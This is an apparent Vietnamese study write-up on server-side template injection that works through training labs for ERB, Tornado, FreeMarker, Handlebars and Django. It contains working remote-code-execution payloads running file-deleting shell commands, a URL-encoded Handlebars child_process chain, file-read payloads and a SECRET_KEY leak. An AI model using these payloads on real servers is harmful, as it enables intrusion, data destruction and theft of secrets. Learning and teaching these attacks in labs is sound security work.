# Server-side template injection

## What is server-side template injection?

`Server-side template injection (SSTI)` là một lỗ hổng xảy ra khi kẻ tấn công có thể sử dụng cú pháp mẫu (template syntax) của công cụ xử lý template để chèn một payload độc hại vào template. Payload này sau đó được thực thi trên phía máy chủ (server-side).

Các công cụ xử lý template (template engines) được thiết kế để tạo ra các trang web bằng cách kết hợp các mẫu cố định (fixed templates) với dữ liệu thay đổi (volatile data). Tuy nhiên, server-side template injection có thể xảy ra khi đầu vào của người dùng được nối trực tiếp vào template thay vì được truyền vào dưới dạng dữ liệu. Điều này cho phép kẻ tấn công chèn các chỉ thị (directives) tùy ý vào template để thao túng công cụ xử lý template, thậm chí chiếm quyền kiểm soát hoàn toàn máy chủ.

Đúng như tên gọi, payload của server-side template injection được gửi và thực thi trên phía máy chủ, khiến nó nguy hiểm hơn nhiều so với các lỗ hổng injection ở phía client (client-side template injection).

## What is the impact of server-side template injection?

`Tác động của lỗ hổng server-side template injection (SSTI) `phụ thuộc vào công cụ xử lý template mà ứng dụng sử dụng và cách ứng dụng triển khai công cụ này. Trong một số trường hợp hiếm hoi, lỗ hổng này có thể không gây ra rủi ro bảo mật đáng kể. Tuy nhiên, phần lớn, tác động của SSTI thường rất nghiêm trọng và thậm chí có thể mang tính thảm khốc.

- Ở mức độ nghiêm trọng nhất, kẻ tấn công có thể đạt được thực thi mã từ xa (remote code execution), cho phép chúng chiếm toàn quyền kiểm soát máy chủ phía sau (back-end server). Từ đó, kẻ tấn công có thể sử dụng máy chủ này để thực hiện các cuộc tấn công khác vào cơ sở hạ tầng nội bộ.

- Ngay cả khi không đạt được thực thi mã từ xa, kẻ tấn công vẫn có thể sử dụng SSTI để thực hiện nhiều kiểu tấn công khác, chẳng hạn như:
  - Truy cập dữ liệu nhạy cảm trên máy chủ.
  - Đọc các tệp tin tùy ý từ hệ thống.
  - Tìm kiếm các thông tin quan trọng để tiếp tục leo thang tấn công.

## How do server-side template injection vulnerabilities arise?

Lỗ hổng server-side template injection (SSTI) xuất hiện khi đầu vào của người dùng được nối trực tiếp vào template thay vì được truyền vào dưới dạng dữ liệu.

- Template tĩnh và truyền dữ liệu đúng cách:

  - Khi các template được thiết kế tĩnh với các chỗ trống (placeholders) để chèn nội dung động và dữ liệu được truyền đúng cách, chúng không bị ảnh hưởng bởi SSTI.
  - Ví dụ với công cụ `Twig`:
    `$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name));`

  > Ở đây, biến `first_name` được truyền vào `template` dưới dạng dữ liệu. `Template engine` sẽ xử lý dữ liệu mà không thực thi cú pháp mẫu bên trong giá trị. Do đó, không tồn tại lỗ hổng SSTI.

- Nối trực tiếp đầu vào người dùng vào `template`

  Khi đầu vào người dùng được nối trực tiếp vào template dưới dạng chuỗi trước khi được render, có nguy cơ cao xảy ra SSTI.

  Ví dụ, nếu người dùng có thể tùy chỉnh nội dung email:
  `$output = $twig->render("Dear " . $_GET['name']);`

  > Ở đây, thay vì truyền giá trị đầu vào `(name)` dưới dạng dữ liệu, nó được ghép thẳng vào `template`. Điều này có thể cho phép kẻ tấn công chèn cú pháp độc hại.

- Kẻ tấn công có thể khai thác bằng cách gửi yêu cầu như:
  `http://vulnerable-website.com/?name={{bad-stuff-here}}` > Do cú pháp của `template` được xử lý phía `server`, payload `{{bad-stuff-here}}` sẽ được thực thi, dẫn đến lỗ hổng SSTI.

- Thiết kế template kém hoặc cố ý:
  - Ngẫu nhiên: Lỗ hổng có thể phát sinh từ lỗi thiết kế template, thường xảy ra khi lập trình viên không quen thuộc với cách bảo mật `template engine`.
  - Cố ý: Một số trang web cho phép người dùng có đặc quyền cao (ví dụ: quản trị viên hoặc biên tập viên nội dung) chỉnh sửa hoặc gửi template tùy chỉnh. Điều này mang lại nguy cơ bảo mật nghiêm trọng nếu tài khoản có đặc quyền bị xâm phạm.

## Constructing a server-side template injection attack

Để xác định lỗ hổng SSTI và tiến hành tấn công thành công, kẻ tấn công thường thực hiện các bước sau:

![image-1]()

### Detect

Lỗ hổng Server-Side Template Injection thường không được chú ý, không phải vì chúng phức tạp mà bởi vì chúng chỉ thực sự rõ ràng đối với những người kiểm tra bảo mật khi họ chủ động tìm kiếm. Nếu bạn phát hiện được lỗ hổng này, việc khai thác nó có thể bất ngờ trở nên rất dễ dàng, đặc biệt trong các môi trường không được sandbox.

Giống như bất kỳ lỗ hổng nào khác, bước đầu tiên để khai thác là phải tìm ra nó. Cách tiếp cận đơn giản nhất để bắt đầu là thử `fuzzing template` bằng cách chèn một chuỗi ký tự đặc biệt thường được sử dụng trong các biểu thức của `template`, chẳng hạn như: `${{<%[%'"}}%\`

Nếu một exception (ngoại lệ) được trả về, điều này chỉ ra rằng cú pháp của template được chèn có thể đã được máy chủ xử lý theo một cách nào đó. Đây là một dấu hiệu cho thấy lỗ hổng SSTI có thể tồn tại.

Lỗ hổng SSTI xảy ra trong hai ngữ cảnh riêng biệt, mỗi ngữ cảnh yêu cầu một phương pháp phát hiện cụ thể. Bất kể kết quả của việc `fuzzing` ra sao, điều quan trọng là nên thử các phương pháp tiếp cận theo ngữ cảnh cụ thể sau đây. Nếu fuzzing không mang lại kết quả rõ ràng, lỗ hổng vẫn có thể được phát hiện qua một trong các cách tiếp cận này. Ngay cả khi `fuzzing` cho thấy có khả năng lỗ hổng SSTI, vẫn cần xác định ngữ cảnh của nó để khai thác hiệu quả.

#### Plaintext context

Hầu hết các ngôn ngữ `template` cho phép tự do nhập nội dung, có thể là sử dụng thẻ HTML trực tiếp hoặc sử dụng cú pháp gốc của `template`, và nội dung này sẽ được render thành HTML ở phía server trước khi phản hồi HTTP được gửi đi. Ví dụ, trong `Freemarker`, dòng mã `render('Hello ' + username)` sẽ được render thành một chuỗi như `Hello Carlos`.

Điều này đôi khi có thể bị khai thác để thực hiện XSS (Cross-Site Scripting) và thực tế thường bị nhầm lẫn với một lỗ hổng XSS đơn giản. Tuy nhiên, bằng cách thiết lập các phép toán toán học làm giá trị của tham số, chúng ta có thể kiểm tra xem đây có phải là một điểm xâm nhập tiềm năng cho cuộc tấn công server-side template injection hay không.

Ví dụ, giả sử có một template chứa đoạn mã dễ bị tổn thương sau: `render('Hello ' + username)`

- Trong quá trình kiểm tra, chúng ta có thể thử nghiệm để phát hiện lỗ hổng server-side template injection bằng cách yêu cầu một URL như sau: http://vulnerable-website.com/?username=${7*7}

- Nếu kết quả trả về chứa `Hello 49`, điều này chứng tỏ phép toán toán học đang được xử lý phía `server`. Đây là một bằng chứng thuyết phục cho lỗ hổng server-side template injection.

Lưu ý rằng cú pháp cụ thể yêu cầu để phép toán toán học được thực hiện thành công sẽ khác nhau tùy thuộc vào `template engine` đang được sử dụng. Chúng ta sẽ thảo luận chi tiết hơn về vấn đề này trong bước `Identify`.

#### Code context

Trong các trường hợp khác, lỗ hổng được phơi bày khi đầu vào của người dùng được chèn vào trong một biểu thức `template`, như chúng ta đã thấy trước đó với ví dụ `email`. Điều này có thể dưới dạng một tên biến có thể kiểm soát bởi người dùng được chèn vào trong tham số, ví dụ như:

`greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)`

Trên trang web, URL kết quả có thể giống như sau:
http://vulnerable-website.com/?greeting=data.username

> Điều này sẽ được render trong kết quả đầu ra là Hello Carlos

Ngữ cảnh này rất dễ bị bỏ qua trong quá trình kiểm tra vì nó không gây ra XSS rõ ràng và gần như không thể phân biệt với việc tra cứu một hashmap đơn giản. Một phương pháp kiểm tra lỗ hổng server-side template injection trong ngữ cảnh này là đầu tiên xác nhận rằng tham số không chứa một lỗ hổng XSS trực tiếp bằng cách chèn HTML tùy ý vào giá trị:

`http://vulnerable-website.com/?greeting=data.username<tag>`

Nếu không có XSS, kết quả thường sẽ là một mục trống trong đầu ra (chỉ có `Hello` mà không có tên người dùng), thẻ được mã hóa hoặc một thông báo lỗi. Bước tiếp theo là thử thoát khỏi câu lệnh bằng cách sử dụng cú pháp `template` thông thường và cố gắng chèn `HTML` tùy ý sau đó:

`http://vulnerable-website.com/?greeting=data.username}}<tag>`

Nếu kết quả vẫn là lỗi hoặc đầu ra trống, điều này có thể là do bạn đã sử dụng cú pháp không phù hợp với ngôn ngữ template hoặc, nếu không có cú pháp template nào hợp lệ, thì lỗ hổng server-side template injection là không thể. Ngược lại, nếu kết quả được render chính xác, kèm theo HTML tùy ý, đây là dấu hiệu rõ ràng rằng lỗ hổng server-side template injection có thể tồn tại: `Hello Carlos<tag>`

### Identify

Sau khi phát hiện tiềm năng của lỗ hổng template injection, bước tiếp theo là xác định template engine đang được sử dụng.

Mặc dù có rất nhiều ngôn ngữ template, nhưng nhiều ngôn ngữ trong số đó sử dụng cú pháp rất giống nhau, được chọn sao cho không xung đột với các ký tự HTML. Do đó, việc tạo các payload kiểm tra để thử nghiệm xem `engine template` nào đang được sử dụng có thể khá đơn giản.

Chỉ cần gửi cú pháp không hợp lệ cũng thường đủ vì thông báo lỗi trả về sẽ cho bạn biết chính xác `engine template` đang được sử dụng, thậm chí đôi khi còn cho biết cả phiên bản của nó. Ví dụ, biểu thức không hợp lệ `<%=foobar%>` sẽ kích hoạt phản hồi sau từ `ERB`, `engine` dựa trên `Ruby`:

![image-2]()

Nếu không có thông báo lỗi rõ ràng, sẽ cần phải thử nghiệm thủ công các payload đặc trưng cho từng ngôn ngữ và nghiên cứu cách chúng được engine xử lý. Sử dụng quá trình loại trừ dựa trên cú pháp hợp lệ hoặc không hợp lệ, có thể thu hẹp các lựa chọn nhanh hơn. Một cách phổ biến để làm việc này là chèn các phép toán toán học tùy ý sử dụng cú pháp từ các `engine template` khác nhau. Sau đó, có thể quan sát xem chúng có được tính toán chính xác hay không. Để hỗ trợ quá trình này, có thể sử dụng cây quyết định tương tự như sau:

![image-3]()

Nên lưu ý rằng cùng một `payload` đôi khi có thể trả về kết quả thành công trong nhiều ngôn ngữ `template` khác nhau. Ví dụ, payload `{{7*'7'}}` sẽ trả về `49` trong `Twig` và `7777777` trong `Jinja2`. Do đó, điều quan trọng là không vội vàng kết luận dựa trên một kết quả thành công duy nhất.

### Exploit

#### Read

Trừ khi đã nắm vững toàn bộ `template engine`, bước đầu tiên thường là đọc tài liệu của nó. Mặc dù đây có thể không phải là cách thú vị nhất để sử dụng thời gian, nhưng không nên đánh giá thấp mức độ hữu ích mà tài liệu có thể mang lại. Các vấn đề cần quan tâm đó chính là:

- Cú pháp template
- Danh sách các phương thức, hàm , bộ lọc
- Các extension/plugins

#### Explore

Tại thời điểm này, có thể đã tìm thấy một khai thác khả thi thông qua việc đọc tài liệu. Nếu chưa, bước tiếp theo là khám phá môi trường và cố gắng xác định tất cả các đối tượng mà bạn có quyền truy cập.

#### Attack

Cho đến giờ, chúng ta đã tập trung vào việc xây dựng một cuộc tấn công bằng cách tái sử dụng một khai thác đã được tài liệu hóa hoặc sử dụng các lỗ hổng nổi tiếng trong một `engine template`. Tuy nhiên, đôi khi bạn sẽ cần phải tạo ra một khai thác tùy chỉnh. Ví dụ, bạn có thể phát hiện rằng `engine template` thực thi các template trong một môi trường sandbox, điều này có thể khiến việc khai thác trở nên khó khăn hoặc thậm chí không thể.

Sau khi xác định được bề mặt tấn công, nếu không có cách khai thác rõ ràng nào, bạn nên tiếp tục với các kỹ thuật kiểm tra truyền thống bằng cách xem xét từng hàm để phát hiện hành vi có thể khai thác. Khi làm việc một cách có hệ thống qua quá trình này, đôi khi bạn có thể tạo ra một cuộc tấn công phức tạp thậm chí có thể khai thác các mục tiêu bảo mật cao hơn.

## Labss SSTI

### Learn the basic template syntax

Học cú pháp cơ bản rõ ràng là quan trọng, cùng với các hàm chính và cách xử lý biến. Ngay cả một điều đơn giản như học cách nhúng các khối mã gốc vào `template` đôi khi cũng có thể nhanh chóng dẫn đến khai thác. Ví dụ, khi bạn biết rằng công cụ template `Mako` dựa trên `Python` đang được sử dụng, việc thực hiện mã từ xa có thể đơn giản như sau:

```<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
```

Trong môi trường không có sandbox, việc thực thi mã từ xa và sử dụng nó để đọc, chỉnh sửa hoặc xóa các tệp tùy ý cũng đơn giản như nhiều `template engine` thông thường.

### Lab: Basic server-side template injection

Lab này dễ bị tấn công bằng cách tiêm mẫu từ phía máy chủ do cấu trúc mẫu ERB không an toàn.

Để giải quyết bài tập này, hãy xem lại tài liệu ERB để tìm hiểu cách thực thi mã tùy ý, sau đó xóa tệp `morale.txt` khỏi thư mục gốc của Carlos.

![image-4]()

Khi thực hiện xem chi tiết sản phẩm đầu tiên có một message được đính kèm lên URL là `Unfortunately this product is out of stock`

![image-5]()

Sau khi đọc tài liệu về ERB thì đây là template được code bằng Ruby [ERB_docs](https://www.puppet.com/docs/puppet/5.5/lang_template_erb). Tôi chú ý đến việc chèn một biểu thức như sau: `<%= EXPRESSION %>`

Kiểm tra với tham số `message=<%= 7*7 %>`, thật sự nó đã render ra kết quả 49

![image-6]()

Bài lab yêu cầu xóa file của Carlos , chèn đoạn mã sau để hoàn thành bài lab:`<%= system("rm /home/carlos/morale.txt") %>`

![image-7]()

### Lab: Basic server-side template injection (code context)

Bài lab này dễ bị tấn công server-side template injection vì cách sử dụng template `Tornado` không an toàn. Để giải quyết bài lab, bạn cần thực hiện các bước sau:

- Xem tài liệu `Tornado`
- Tìm hiểu cách sử dụng cú pháp `template` Tornado để thực thi mã tùy ý (arbitrary code execution).
- Tấn công để đạt quyền thực thi mã từ xa (RCE)

Thực hiện khai thác lỗ hổng template injection để thực thi mã Python trên server. Xóa file morale.txt trong thư mục home của Carlos

Đăng nhập thông tin tài khoản login, trang web có chức năng thay đổi tên hiển thị của chính mình trên comment các bài viết(Preferred name), sử dụng burpsuite để xem rõ hơn

![imagr-8]()

![image-9]()

Để ý tham số `blog-post-author-display=user.name&csrf=E82BacnzfeGlNcSFN13I4v5Kao4SrK7A` như vậy có thể thấy việc render ra sử dụng biến object là `user`, tùy theo lựa chọn muốn hiển thị mà render ra bao gồm cả `user.firs_tname` , `user.nick_name`

![image-10]()

Tài liệu về [Tornado](https://www.tornadoweb.org/en/stable/template.html) đề cập đến việc sử dụng expresstion là dùng dấu ngoặc kép nhọn `{{expression}}`

![image-11]()

Do `user.first_name` sẽ đưọc đưa vào template engine nên chúng ta sẽ kết thúc phần cuối của nó lại và tiến hành kiểm tra sự tồn tại của SSTI như sau: `}}{{7*7}}`

![image-13]()

Quay lại trang bình luận bài post sẽ thấy tên của người comment lúc này là `Peter49}}`

![image-12]()

Bây giờ nạp module `os` để thực hiện hàm `system` xóa file của `Carlos`, cú pháp để thực thi python là {`% somePython %}`, cuối cùng payload là:

```{% import os %}
{{os.system('rm /home/carlos/morale.txt')}}
```

![image-14]()

![image-15]()

### Read about the security implications

Đọc về các khía cạnh bảo mật

Ngoài việc cung cấp các nguyên tắc cơ bản về cách tạo và sử dụng `template`, tài liệu cũng có thể bao gồm một phần liên quan đến "Bảo mật" (Security). Tên của phần này có thể khác nhau, nhưng nó thường liệt kê tất cả các hành vi tiềm ẩn nguy hiểm mà người dùng nên tránh khi làm việc với template. Đây có thể là một nguồn tài nguyên vô giá, thậm chí hoạt động như một dạng `"cheat sheet"` giúp biết những hành vi nào cần tìm kiếm trong quá trình kiểm tra, cũng như cách khai thác chúng.

Ngay cả khi không có một phần chuyên biệt về `"Bảo mật"`, nếu một đối tượng hoặc hàm tích hợp nào đó có thể gây rủi ro bảo mật, tài liệu hầu như luôn đưa ra một cảnh báo dưới dạng nào đó. Cảnh báo này có thể không cung cấp quá nhiều chi tiết, nhưng ít nhất nó sẽ đánh dấu đối tượng hoặc hàm cụ thể này như một điều cần điều tra thêm.

Ví dụ, trong ERB, tài liệu tiết lộ rằng có thể liệt kê tất cả các thư mục và đọc các tệp tùy ý như sau:

```
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```

### Lab: Server-side template injection using documentation

Để giải quyết vấn đề trong phòng thí nghiệm, hãy xác định công cụ mẫu và sử dụng tài liệu để tìm ra cách thực thi mã tùy ý, sau đó xóa tệp `Morale.txt` khỏi thư mục chính của Carlos.

Đăng nhập vào tài khoản của riêng mình bằng thông tin đăng nhập sau: `content-manager:C0nt3ntM4n4g3r`

Sau khi đăng nhập vào tài khoản trên ta thấy có chức năng `edit templates` như sau:

![image-16]()

![image-17]()

Trang web sử dụng template `<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>
`

Khi edit template với 1 đối tượng không tồn tại, trang web bắn ra lỗi và chứa thông tin quan trọng về template được sử dụng là `FreeMarker`

![image-18]()

Tôi kiểm tra thử với payload đơn giản ${7\*7} và nhận được đầu ra `Hurry! Only 49 left of 49 at 49` -> server có lỗ hổng server-side template injection (SSTI)

![image-19]()

Sau một hồi đọc dos của [FreeMarker](), tôi thấy rằng có thể cho phép người dùng tải mẫu lên và những tác động bảo mật khi làm điều đó ở mục `FAQ` là `Can I allow users to upload templates and what are the security implications?` và gợi ý tích hợp với từ khóa `new()`

![image-20]()

![image-21]()

> Hiểu đơn giản là `FreeMarker` có một lớp `TemplateModel` có thể được sử dụng để tạo các đối tượng Java tùy ý. Tính năng built-in này có thể là một vấn đề bảo mật vì có thể tạo các đối tượng Java tùy ý và sau đó sử dụng chúng, miễn là chúng triển khai `TemplateModel`

Xem qua các class implement `TemplateModel`, tôi đặc biệt chú ý đến class `Execute`, có thể được sử dụng để thực thi các lệnh shell tùy ý.

![image-22]()

Cuối cùng payload được thực hiện như sau:

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

![image-23]()

![image-24]()

### Look for known exploits

Một khía cạnh quan trọng khác của việc khai thác lỗ hổng SSTI là giỏi tìm kiếm các tài nguyên bổ sung trực tuyến. Khi có thể xác định được công cụ mẫu đang được sử dụng, nên duyệt web để tìm bất kỳ lỗ hổng nào mà người khác có thể đã phát hiện ra. Do một số `template engines` được sử dụng rộng rãi, đôi khi có thể tìm thấy các khai thác được ghi chép rõ ràng mà có thể điều chỉnh để khai thác trang web mục tiêu của riêng mình.

### Lab: Server-side template injection in an unknown language with a documented exploit

![image-25]()

Khi tôi test bằng một payload chung cho các ngôn ngữ như `${{<%[%'"}}%\`, tôi biết được template được sử dụng là `handlebars`

![image-26]()

Tìm kiếm thông tin về payload handlebar này trên [Hacktrick](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs), tôi thấy có payload như sau:

![image-27]()

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

URLencoded:
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

Tùy chỉnh một chút do chúng ta muốn xóa tệp của Carlos nên chỉ cần tùy chỉnh `{{this.push "return require('child_process').exec('whoami');"}}` thành `{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}`

```
test{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

![image-28]()

```
%74%65%73%74%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

![image-29]()

![image-30]()

### Developer-supplied objects

Khám phá (Explore)

Tại thời điểm này, có thể đã tìm thấy một khai thác khả thi bằng cách sử dụng tài liệu. Nếu chưa, bước tiếp theo là khám phá môi trường và cố gắng phát hiện tất cả các đối tượng mà chúng ta có quyền truy cập.

Nhiều `template engine` cung cấp một đối tượng `"self"` hoặc `"environment"`, hoạt động như một không gian tên chứa tất cả các đối tượng, phương thức và thuộc tính được hỗ trợ bởi `engine template`. Nếu có đối tượng như vậy, chúng ta có thể sử dụng nó để tạo danh sách các đối tượng nằm trong phạm vi hoạt động.

Ví dụ, trong các ngôn ngữ tạo mẫu dựa trên `Java`, đôi khi có thể liệt kê tất cả các biến trong môi trường bằng cách sử dụng lệnh sau: `${T(java.lang.System).getenv()}`

> Điều này có thể trở thành cơ sở để tạo danh sách các đối tượng và phương thức tiềm năng thú vị để điều tra thêm.

Ngoài ra, đối với người dùng `Burp Suite Professional`, công cụ `Intruder` cung cấp một danh sách từ tích hợp sẵn để `brute-force `tên biến.

Cần lưu ý rằng các trang web sẽ chứa cả các đối tượng tích hợp sẵn được cung cấp bởi `template engine` và các đối tượng tùy chỉnh, đặc thù của trang web được cung cấp bởi nhà phát triển. Nên đặc biệt chú ý đến các đối tượng không chuẩn này vì chúng thường có khả năng chứa thông tin nhạy cảm hoặc các phương thức có thể khai thác. Do các đối tượng này có thể khác nhau giữa các `template` trong cùng một trang web, bạn cần xem xét hành vi của một đối tượng trong bối cảnh của từng template riêng biệt trước khi tìm ra cách khai thác nó.

Mặc dù việc tiêm template phía máy chủ (server-side template injection) có khả năng dẫn đến thực thi mã từ xa và chiếm quyền kiểm soát hoàn toàn máy chủ, nhưng trong thực tế, điều này không phải lúc nào cũng có thể thực hiện được. Tuy nhiên, việc không đạt được thực thi mã từ xa không có nghĩa là không có khả năng khai thác khác. Chúng ta vẫn có thể tận dụng các lỗ hổng tiêm template phía máy chủ để thực hiện các khai thác nghiêm trọng khác, chẳng hạn như `file path traversal`, nhằm truy cập dữ liệu nhạy cảm.

### Lab: Server-side template injection with information disclosure via user-supplied objects

Lab này vẫn là `edit template` sử dụng fuzzing string là `${{<%[%'"}}%\` và biết được template engine sử dụng là `django template`

![image-31]()

Tôi tìm kiếm thông tin về `django` và tìm được một thông tin về `dubug`. Sau khi tìm hiểu thì `{% debug %}` là một `template tag` được sử dụng để hiển thị thông tin gỡ lỗi trong quá trình phát triển. Khi được thêm vào trong một `template`, nó sẽ hiển thị danh sách tất cả các biến ngữ cảnh (context variables) và các thông tin liên quan mà bạn có thể truy cập trong `template` đó

![image-32]()

![image-33]()

Một thông tin nữa được tìm thấy là `{settings.SECRET_KEY}`, `settings.SECRET_KE`Y là một thuộc tính trong module `django.conf.settings`, nơi chứa các cài đặt cấu hình của dự án Django, bao gồm khóa bí mật `(SECRET_KEY)`. Khóa này được sử dụng để:

- Ký và xác minh session cookies.
- Bảo vệ các token CSRF, JWT, hoặc các giá trị đã mã hóa.
- Cung cấp cơ sở bảo mật cho nhiều chức năng khác của Django.

Đầu tiên tôi kiểm tra thử trước với `{{settings}}` thì nhận được &`lt;UserSettingsHolder&gt;` điều này cho thấy rằng đối tượng `settings` đã được truy cập thành công, nhưng nó không hiển thị toàn bộ nội dung mà chỉ là dạng đại diện của đối tượng. `Django` sử dụng một lớp gọi là `UserSettingsHolder` để lưu trữ và quản lý các cài đặt (`settings`) của ứng dụng. Đây là một đại diện của module `django.conf.settings`, nhưng trong template, không thể truy cập trực tiếp mọi thuộc tính của nó mà không gọi cụ thể từng giá trị

Có lẽ bài lab chỉ yêu cầu tìm ra SECRET_KEY nên tôi sẽ không đi sâu vào tìm hiểu thêm nữa , cuối cùng nhập `{{settings.SECRET_KEY}}` để solve bài lab

![image-34]()

> 6zhztofezsp0mexkxhg9vdjb4yd0q56r

### Create a custom attack

Cho đến thời điểm này, chúng ta đã chủ yếu tập trung vào việc tạo một cuộc tấn công bằng cách tái sử dụng các khai thác đã được ghi nhận hoặc tận dụng các lỗ hổng phổ biến trong các `engine template`. Tuy nhiên, đôi khi chúng ta sẽ cần phải tự tạo ra một khai thác tùy chỉnh. Ví dụ, có thể phát hiện rằng `engine template` thực thi các mẫu bên trong một sandbox, điều này làm cho việc khai thác trở nên khó khăn hoặc thậm chí không thể thực hiện được.

#### Constructing a custom exploit using an object chain

